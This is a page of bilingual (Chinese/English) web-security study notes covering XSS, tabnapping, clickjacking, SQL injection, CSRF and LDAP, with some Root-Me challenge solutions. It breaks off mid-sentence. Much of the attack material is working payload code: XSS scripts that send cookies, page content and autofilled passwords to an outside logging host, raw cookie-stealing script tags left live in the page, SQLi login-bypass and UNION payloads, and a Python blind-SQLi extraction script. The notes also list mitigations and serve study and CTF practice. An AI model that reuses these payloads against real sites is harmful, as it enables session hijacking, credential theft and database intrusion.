class="even"><td>Clinet 客户端</td><td>-</td></tr><tr class="odd"><td>Connection 连接</td><td>网络通信方式</td></tr><tr class="even"><td>Internet 因特网</td><td>-</td></tr><tr class="odd"><td>Network Interface Card 网络接口卡 (NIC)</td><td>硬件适配器, 连接网络为主机获取<u>Packets包</u></td></tr><tr class="even"><td>Spoof 欺骗</td><td>伪装成其他人</td></tr><tr class="odd"><td>Protocol 协议</td><td>软件必须遵守的<u>Set of Rules一系列规则</u></td></tr></tbody></table></blockquote><p><strong>Permission 权限</strong></p><blockquote><p><em>道德</em>与不道德的主要区别就是是否依据 <strong>VulnerabilityDisclosure Policy (VDP) 漏洞披露政策</strong></p><blockquote><p>问:是不是有<strong>VDP</strong>就代表被赋予了纰漏<strong>Promission权限</strong>？</p></blockquote><p>依照<strong>VDP</strong>进行的<u>漏洞批漏</u>才算是<em>道德的</em>,同时需要按照<strong>VPD</strong>给出的:</p><ol type="1"><li><u>How</u>如何纰漏漏洞</li><li><u>When</u>什么时间允许</li><li><u>Scope</u>测试范围</li></ol><p><strong>VDP格式</strong></p><ol type="1"><li>Guidelines 准则</li><li>Host on the Company / Department’s website or resources</li><li>Scope 允许测试范围</li><li>Exclusions 不能测试的</li><li>Expectations of handling 期望你如何做 (例如)</li><li>A Way to Contact the organisation 组织联系方式</li></ol></blockquote><p><strong>HTML Events</strong></p><blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">event</span>=<span class="string">&#x27;some JavaScript&#x27;</span>&gt;</span> <span class="comment">&lt;!--调用JS--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">on</span> <span class="attr">click</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>Alert!<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="comment">&lt;!--点击相应--&gt;</span></span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th>时间</th><th>解释</th></tr></thead><tbody><tr class="odd"><td><code>onchange</code></td><td>html element 被改变</td></tr><tr class="even"><td><code>onclick</code></td><td>点击时间</td></tr><tr class="odd"><td><code>onmouseover</code></td><td>鼠标悬停html element</td></tr><tr class="even"><td><code>onmouseout</code></td><td>鼠标离开html element</td></tr><tr class="odd"><td><code>onkeydown</code></td><td>按键盘</td></tr><tr class="even"><td><code>onload</code></td><td>浏览器加载</td></tr><tr class="odd"><td><code>onerror</code></td><td>错误: 例如图片无法加载</td></tr></tbody></table></blockquote><p><strong>HTTP Cookies 信息记录程序</strong></p><blockquote><ol type="1"><li><p>Tracking</p></li><li><p>Authentication 鉴定</p><ul><li>identify whether user is logged in 识别用户是否已登录</li></ul></li><li><p>Security Measures</p><ul><li><table><colgroup><col style="width: 13%" /><col style="width: 86%" /></colgroup><thead><tr class="header"><th>Attribute</th><th>Definition</th></tr></thead><tbody><tr class="odd"><td>HTTPOnly</td><td>JS cannot access it <br>unless the browser has vulnerabilities</td></tr><tr class="even"><td>Secure</td><td>Must be send over SSL/TLS</td></tr><tr class="odd"><td>Expires</td><td>用户端cookie被删除的时间</td></tr><tr class="even"><td>Domain</td><td>域 domain is relates to, <br>e.g. ‘google.com’</td></tr><tr class="odd"><td>Path</td><td>网站应用中的路径</td></tr></tbody></table></li></ul></li></ol><blockquote><p>If the Expiry is not set, or is set to “Session”, the browser willremove the cookie upon closing如果<u>未设置</u>到期<u>或设置为"Session"</u>，<u>浏览器将在关闭时删除cookie</u>.</p></blockquote><blockquote><p>Cookie Expiry必须在<strong>客户端</strong>和<strong>服务器端</strong>完成,<u>两端完成</u>。</p></blockquote><blockquote><p>如果<strong>服务器</strong><u>未正确终止</u> Cookie，则具有 Cookie值的任何人都可以使用它作为您的用户进行身份验证。</p></blockquote></blockquote><p><strong>Domain Name Service (DNS) 域名服务系统</strong></p><blockquote><p>DNS类似于一个电话黄页, 存储着域名对应的IP地址，DNS使用不排序的UDP包裹 <u>Unordered UDP packets</u>,并且是<u>不加密</u>的。</p><p><strong>DNS Records Type</strong>:</p><table><thead><tr class="header"><th>Type</th><th>Des</th></tr></thead><tbody><tr class="odd"><td>A</td><td>Address Record</td></tr><tr class="even"><td>AAAA</td><td>IPv6 Address Record</td></tr><tr class="odd"><td>CNAME</td><td>Canonical Record Name 规范名称记录</td></tr><tr class="even"><td>MX</td><td>Mail Exchange Record 存储邮件交换</td></tr><tr class="odd"><td>TXT</td><td>Text Record 存储文字</td></tr><tr class="even"><td>NS</td><td>Name Server Record</td></tr></tbody></table></blockquote><p><strong>Asynchronous异步 JavaScript And XML (AJAX)</strong></p><blockquote><ol type="1"><li>后台请求在<u>浏览器中运行</u></li><li>使 Web应用程序更具<u>交互性</u></li></ol></blockquote><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/iShot2022-03-03 15.18.01.png" alt="iShot2022-03-03 15.18.01" style="zoom:50%;" /></p><p><strong>Document Object Model (DOM) 文档对象模型</strong></p><blockquote><p>parsing 解析 HTML 和 XML</p><p>Object-oriented representation of web pages 网页的面向对象表示</p><p>can be controoled by scripting languages like <em>JavaScript</em></p></blockquote><h2 id="xss">XSS</h2><p><strong>定义</strong></p><blockquote><p><strong>Cross-Site Scripting (XSS) 跨网站脚本攻击</strong>:由于服务端存在漏洞, js代码被受害者客户端执行</p><p>存储型: 危害大, 不需要受害者点击。</p><p>反射型: 代码不存在服务器上, 需要受害者点击。</p><p>DOM型: 需要受害者点击, 用户载荷是在用户主机生成的。</p><p><ahref="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">XSSFilter Evasion</a></p></blockquote><p><strong>Reveal</strong></p><ol type="1"><li>JS Pop-up<ul><li><code>&lt;script&gt;alert()&lt;/script&gt;</code></li><li><code>"-confirm-"</code></li></ul></li></ol><p><strong>Exploit</strong></p><ol type="1"><li><p><strong>Steal cookie</strong></p><ul><li><p><code>document.</code> 中除了cookie有其他的存储信息:</p><ul><li><code>document.domain</code></li><li><code>document.cookie</code></li><li><code>document.body.innerHTML</code></li></ul></li><li><p>用window.location:<code>&lt;script&gt;window.location="&#123;url&#125;/?cookie=&#123;document.domain&#125;"&lt;/script&gt;</code></p></li><li><p>用fetch:<code>&lt;script&gt;fetch('&#123;endpoint_url&#125;/?'+ document.Cookie, &#123;method: 'GET'&#125;);&lt;/script&gt;</code></p></li><li><p>AJAX with XMLHttpRequest:</p></li></ul></li></ol><p><strong>Simple</strong>:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="comment">// 1. Define Variable use XHR to connect browser with server.</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> XHR = <span class="keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="javascript"><span class="comment">// 2. get cookie from the GET request</span></span></span><br><span class="line"><span class="javascript">XHR.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript"><span class="comment">// 3.Send Request</span></span></span><br><span class="line"><span class="javascript">XHR.send(); </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Get HTML content</strong>:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    x.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://zhidongz.free.beeceptor.com/?data=&quot;</span> + <span class="built_in">document</span>.body.innerHTML, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    x.send();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Nested</strong>:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> XHR_OUTTER=<span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">XHR_OUTTER.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript"></span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(XHR_OUTTER.readyState==<span class="number">4</span> &amp;&amp; XHR_OUTTER.status==<span class="number">200</span>)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> XHR_INNER = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="javascript">        XHR_INNER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span>+ XHR_OUTTER.responseText, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">        XHR_INNER.send()</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">XHR_OUTTER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/flag.php&quot;</span>, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">XHR_OUTTER.send()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>XSS获取从密码补全获取密码</strong></li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> </span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">stealPwd</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> user = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;username&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> pass = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;password&#x27;</span>).value;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> url = <span class="string">&quot;http://&lt;attacker_log&gt;?username=&quot;</span> + username + <span class="string">&quot;&amp;password=&quot;</span> + password;</span></span><br><span class="line"><span class="javascript">  request.open(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">  request.send();</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> test = <span class="built_in">window</span>.setInterval(<span class="string">&quot;function()&quot;</span>, <span class="number">5000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>Impact</strong></p><ol type="1"><li>Steal cookie</li><li>Steal DOM</li><li>Steal Local Storage</li><li>操纵 AJAX 调用以执行不被授权的操作</li></ol><p><strong>Remediation</strong></p><blockquote><p>不要使用黑名单 Blacklist</p></blockquote><ol type="1"><li>Filter using regex</li><li>WAF (不是防御机制, 而是额外的保护层)<ul><li>通过过滤恶意行为来防范漏洞, 有助于防止难以修补的漏洞</li></ul></li><li>HTML 编码: 将信息从一个字符表示形式转换为另一个字符表示形式<ul><li>URL</li><li>HTML</li><li>Base64</li></ul></li><li>Content Security Policy (CSP) 内容安全政策<ul><li>服务器强制实施的安全机制</li><li>浏览器使用服务器的规范进行编译</li><li>声明已批准的内容来源</li><li>用于不断缓解 XSS</li></ul></li><li>X-XSS 保护标头<ul><li>由服务器强制执行</li><li>浏览器试图遵守</li><li>用于要求浏览器强制实施 XSS 审核员保护</li><li>在沙盒中加载</li><li>不再存在于 Chrome 和 Firefox 中。</li></ul></li></ol><h2 id="reflected-xss">Reflected XSS</h2><p><strong>定义</strong></p><blockquote><p><ahref="https://portswigger.net/web-security/cross-site-scripting/reflected">反射型跨站点攻击Reflected XSS</a>: 代码不存在服务器上, 需要受害者点击。</p></blockquote><blockquote><p><ahref="https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected">Root-MeXSS - Reflected</a>:<code>?p='onmouseover='window.location.href("&lt;img src=https://zhidongz.free.beeceptor.com?".concat(document.cookie).concat(" /&gt;"))</code>- <code>onmouseover</code>: 当管理员鼠标经过链接就会触发恶意代码。 -<code>&lt;img/&gt;</code>: 因为script 被过滤掉了。 -<code>concat</code>: 因为<code>+</code>会被浏览区过滤。 -<code>document.write()</code>:在document被加载完后调用<code>docuemnt.write()</code>方法时将会自动去触发<code>document.open()</code>打开一个新的流,并擦除当前文档的内容。载入页面后,浏览器输出流自动关闭；在此之后，任何一个对当前页面进行操作的<code>document.write()</code>方法将打开—个新的输出流。它将清除当前页面内容(包括源文档的任何变量或值)。- 结果: <code>/?flag=r3fL3ct3D_XsS_fTw</code></p></blockquote><h2 id="stored-xss">Stored XSS</h2><p><strong>Exploit</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 1. Define Variable use XHR to connect browser with server.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> XHR = <span class="keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="javascript">    <span class="comment">// 2. get cookie from the GET request</span></span></span><br><span class="line"><span class="javascript">    XHR.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + <span class="built_in">document</span>.cookie, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 3.Send Request</span></span></span><br><span class="line"><span class="javascript">    XHR.send(); </span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> XHR_OUTTER = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (XHR_OUTTER.readyState == <span class="number">4</span> &amp;&amp; XHR_OUTTER.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> XHR_INNER = <span class="keyword">new</span> XMLHttpRequest()</span></span><br><span class="line"><span class="javascript">            XHR_INNER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://zhidongz.free.beeceptor.com/?cookie=&quot;</span> + XHR_OUTTER.responseText, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">            XHR_INNER.send()</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;flag.php&quot;</span>, <span class="literal">true</span>)</span></span><br><span class="line"><span class="javascript">    XHR_OUTTER.send()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><h2id="root-me-xss---stored-1-scriptdocument.writeimg-srchttpszhidongz.free.beeceptor.comdocument.cookiescript"><ahref="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1?lang=en">Root-MeXSS - Stored 1</a>:<code>&lt;script&gt;document.write("&lt;img src=https://zhidongz.free.beeceptor.com"+document.cookie+"/&gt;");&lt;/script&gt;</code></h2></blockquote><ol type="1"><li><code>&lt;script&gt;window.location.href="https://zhidongz.free.beeceptor.com?cookie="+document.domain;&lt;/script&gt;</code></li><li><code>&lt;script&gt;window.location.href="&#123;target_url&#125;"&lt;/script&gt;</code></li></ol><script>document.write('<img src="https://zhidongz.free.beeceptor.com?cookie='+document.cookie+'" width=0 height=0 border=0/>');</script><script>document.write('<img src="https://zhidongz.free.beeceptor.com?cookie'+document.cookie+'" width=0 height=0 border=0 />');</script><script>document.write("<img src='https://zhidongz.free.beeceptor.com?="+document.cookie+"'></img>");</script><h2 id="dom-based-xss">DOM-Based XSS</h2><blockquote><p>类似 Reflected XSS, 但是代码存在于 DOM 中, 而不是在服务器上。用户与服务器交互时不执行攻击者代码。交互结束后在用户浏览器执行恶意代码。</p></blockquote><h2 id="tabnapping">Tabnapping</h2><p><strong>定义</strong></p><blockquote><p><strong>Tabnapping 浏览器分页绑架</strong>: 在网络浏览器中绑架Tab分页, 允许攻击者打开关闭分页和更改标签页跳转的URL地址</p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li>找到: `<code>target="_blank_"</code> (过时的方法)</li><li>打开: <code>window.opener.location.replace("&#123;URL&#125;")</code></li><li>关闭: <code>window.opener.close()</code></li></ol><p><strong>Impact</strong></p><blockquote><p>风险级别: 低</p></blockquote><p><strong>Remediation</strong></p><ol type="1"><li>不要用: `<code>target="_blank_"</code></li><li>使用: `rel="nofollow noopener noreferrer" target="_blank"</li><li>或者: <code>target="_parent"</code></li></ol><h2 id="clickjacking">Clickjacking</h2><blockquote><p><strong>Clickjacking 点击劫持</strong>: 将 UI 叠加在目标 Web应用程序之上, 以便在未经授权的情况下执行操作</p></blockquote><p><strong>Impact</strong></p><blockquote><p>非常具有欺骗性, 但影响不严重</p></blockquote><h2 id="subdomain-takeovers">Subdomain Takeovers</h2><blockquote><p>子域名接管</p></blockquote><h2 id="sqli"><ahref="https://portswigger.net/web-security/sql-injection">SQLi</a></h2><blockquote><p><strong>SQL Injection Attack 机构化查询语句注入攻击</strong>:通过用户端输入的SQL语句被服务器接受并执行</p></blockquote><p><strong><ahref="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-authentication">AuthenticationBypass</a></strong>:</p><ol type="1"><li><code>login=admin&amp;password='or 1=1 --</code> or<code>login=admin&amp;password=admin'or 1=1 order by username --</code></li><li><code>login=admin'and 1=1--'&amp;password=test</code></li></ol><p><strong>SQL两种Comment</strong></p><ol type="1"><li><code>--</code></li><li><code>#</code></li></ol><blockquote><p><code>+</code>加号用做空格</p><p><code>--+</code></p></blockquote><h2 id="sqli-union-attacks"><ahref="https://portswigger.net/web-security/sql-injection/union-attacks">SQLiUNION Attacks</a></h2><p><ahref="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric">SQLiteExample</a>: 1.<code>?action=news&amp;news_id=0 UNION SELECT 1,2,sql FROM sqlite_master</code>2.<code>?action=news&amp;news_id=0 UNION SELECT 1,username,password FROM users</code></p><p><strong>Get Database Version</strong></p><p><code>UNION SELECT 1,2,@@VERSION--+</code></p><p><strong>GET Schema Name</strong></p><ol type="1"><li><code>'UNION SELECT 1,2,schema()--+</code></li><li><code>'UNION SELECT 1,2,database()--+</code></li></ol><p><strong>Get Table Name</strong></p><p><code>'UNION SELECT 1,TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES--+</code></p><p><strong>Get String Value</strong></p><p><code>'UNION SELECT 1,string,3,4 FROM Secure.Flag--+</code></p><p><strong>Retrieve Multiple Values in a Single Column</strong></p><p><code>' UNION SELECT NULL, &#123;column_name_1&#125; ||'&#123;链接符&#125;'||&#123;column_name_2&#125; FROM &#123;table_name&#125; --</code></p><h2 id="authentication-bypass-with-limit">Authentication Bypass with<code>LIMIT</code></h2><p><strong>Exploit</strong></p><ol type="1"><li>python: <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;SELECT * FROM &#123;table_name&#125; WHERE &#123;column_name&#125;=&#x27;&quot;</span>+request.args[<span class="string">&#x27;&#123;column_name&#125;&#x27;</span>]+<span class="string">&quot;&#x27;AND &#123;target_column_name&#125;=&#x27;&quot;</span> + request.args[<span class="string">&#x27;&#123;target_column_name&#125;&#x27;</span>] + <span class="string">&quot;&#x27;;&quot;</span></span><br></pre></td></tr></table></figure></li><li>URL: <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://&#123;url&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=text&#x27; or 1=1 LIMIT 1-- &amp;password=password</span><br></pre></td></tr></table></figure></li><li>SQLi: <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> &#123;table_name&#125;</span><br><span class="line"><span class="keyword">WHERE</span> &#123;column_name&#125;<span class="operator">=</span><span class="string">&#x27;&#123;known_value&#125;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> LIMIT <span class="number">1</span><span class="comment">--&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> &#123;target_column_name&#125; <span class="operator">=</span> <span class="string">&#x27;&#123;changed_value&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ol><h2 id="blind-sqli"><ahref="https://portswigger.net/web-security/sql-injection/blind">BlindSQLi</a></h2><blockquote><p><ahref="https://portswigger.net/web-security/sql-injection/cheat-sheet">CheatSheet</a></p></blockquote><p><strong>Exploit</strong></p><ol type="1"><li><p>Payload:<code>SELECT &#123;column_name&#125; FROM &#123;table_name&#125; WHERE &#123;column_name&#125; = '&#123;Password&#125;' UNION SELECT 1 from users where username = 'administrator' and if(SUBSTRING(password,&#123;i&#125;,1) = '&#123;char&#125;', sleep(3), sleep(0))--</code></p></li><li><p>Python:</p></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="comment"># URL ENCODING</span></span><br><span class="line"><span class="comment"># AUTHENTICATION</span></span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://&#123;domain_url&#125;/auth.php&quot;</span></span><br><span class="line">credential = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;&#123;username&#125;&quot;</span>, <span class="string">&quot;pass&quot;</span>: <span class="string">&quot;&#123;password&#125;&quot;</span>&#125;</span><br><span class="line"><span class="comment"># ESTABLISH CONNECTION </span></span><br><span class="line">session.post(url, data=credential)</span><br><span class="line"><span class="comment"># CHARACTER SET</span></span><br><span class="line">chars = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\&quot;#()*+,-./:;&lt;=&gt;?@&#123;&#125;~[\]$%&amp;&#x27;^_`&quot;</span></span><br><span class="line">target = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(&#123;range_str&#125;, &#123;range_end&#125;):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload = <span class="string">f&quot;&#x27;UNION SELECT 1,2,3 FROM (SELECT GROUP_CONCAT(<span class="subst">&#123;COLUMN_NAME&#125;</span>) AS val FROM Secure.<span class="subst">&#123;TABLE_NAME&#125;</span> WHERE <span class="subst">&#123;TARGET_COLUMN_NAME&#125;</span> LIKE &#x27;%<span class="subst">&#123;KNOWN_VALUE&#125;</span>%&#x27;) AS tables WHERE BINARY SUBSTRING(val,<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;;#&quot;</span></span><br><span class="line">        respond = session.get(<span class="string">&quot;http://&#123;domain_url&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=&quot;</span>+quote(payload)) <span class="comment"># URL ENCODING</span></span><br><span class="line">        <span class="keyword">if</span> respond.text == <span class="string">&#x27;true&#x27;</span>:</span><br><span class="line">            target.append(char)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Currnet: &quot;</span>, <span class="string">&quot;&quot;</span>.join(target))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RESULT: &quot;</span>,<span class="string">&quot;&quot;</span>.join(target))</span><br></pre></td></tr></table></figure><p><strong>Mitigation</strong></p><ol type="1"><li>Prepared Statements</li><li>Stored Procedures</li><li>White List Input Validation</li><li>Escaping User Input</li><li>WAF</li><li>Blacklisting Input</li></ol><h2 id="sql-wildcard-attack">SQL Wildcard Attack</h2><p><strong>Exploit</strong></p><ol type="1"><li>用 <strong>下划线 <code>_</code></strong> 或者<strong>百分号<code>%</code></strong></li><li>或者<strong>双百分号</strong>:<code>SELECT &#123;column_name&#125; FROM &#123;table_name&#125; WHERE &#123;column_name&#125; = '%%'</code></li><li>注意注入语句(Payload), 需要预先通过URL Encoding:<code>%25</code></li></ol><h2 id="csrf">CSRF</h2><p><strong>定义</strong></p><blockquote><p>Cross-Site Request Forgery 跨站点请求伪造 (CSRF)</p></blockquote><p><strong>Mitigation</strong></p><ol type="1"><li><strong>CSRF令牌</strong>:不可预测的高熵,与一般的会话令牌一样。绑定到用户的会话 在执行相关操作之前,在每种情况下都经过严格验证。动态每次加载任何页面无法预测。</li><li><strong>Referrers 推荐人</strong>: 除 CSRF 令牌外,仅将特定推荐人列入白名单</li><li>CORS 设置: 仅允许受信任的源！<ul><li>不要做: <code>Access-Control-Allow-Origin: *</code></li></ul></li></ol><p><strong>Exploit</strong></p><ol type="1"><li><strong>AJAX</strong>: (除了 <code>GET</code> 之外的任何 HTTP (i.e.POST) ⽅法需要<strong>Pre-Flight 预检</strong>）</li><li><strong>HTML Form 表单</strong><ul><li>首先Burp-suite intercept 截获修改email的请求, 得到:<code>CSRF</code></li><li>用获取的<code>CSRF</code>, 通过发送HTML表单发送请求,(只能执⾏<code>GET</code>和<code>POST</code>，但不需要<strong>Pre-Flight预检</strong>)</li></ul></li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&#123;url&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;url_encoded_email&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--CSRF If Required--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;csrf&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--自动提交表单</span></span><br><span class="line"><span class="comment">    &lt;script&gt;</span></span><br><span class="line"><span class="comment">        document.getElementById(&quot;form1&quot;).submit()</span></span><br><span class="line"><span class="comment">    &lt;/script&gt;</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3" type="1"><li><strong>Python</strong></li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;&#123;url&#125;&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;auth&#x27;</span>: <span class="string">&#x27;&#123;auth&#125;&#x27;</span>,<span class="string">&#x27;operation&#x27;</span>: <span class="string">&#x27;fetch&#x27;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="comment"># Cookie: Use PAPSESSID=Login_Credential</span></span><br><span class="line">    <span class="comment"># CSRF_token is not required</span></span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;CSRF_token=&#123;csrf_token&#125;&#x27;</span>,</span><br><span class="line">    <span class="comment"># given csrf token</span></span><br><span class="line">    <span class="string">&#x27;csrf&#x27;</span>: <span class="string">&#x27;&#123;csrf&#125;&#x27;</span>,</span><br><span class="line">    <span class="comment"># given X-Auth:</span></span><br><span class="line">      <span class="comment"># X-Auth-Token 作为未注册的标头，它不受正式规范的约束</span></span><br><span class="line">      <span class="comment">#   1. 用户必须首次提供用户名/密码</span></span><br><span class="line">      <span class="comment">#   2. 服务器在标头字段“ x-auth-token”中返回访问令牌。</span></span><br><span class="line">      <span class="comment">#   3. 以后的会话, 交换X-Auth-Token，而不交换用户名/密码。</span></span><br><span class="line">    <span class="string">&#x27;X-Auth&#x27;</span>: <span class="string">&#x27;secure-auth&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, headers=headers, data=payload)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><h2 id="ldap">LDAP</h2><p><strong>定义</strong></p><blockquote><p><strong>Lightweight Directory Access Protocol轻量级目录访问协议</strong>: 与 SQLi 非常相似, 操作 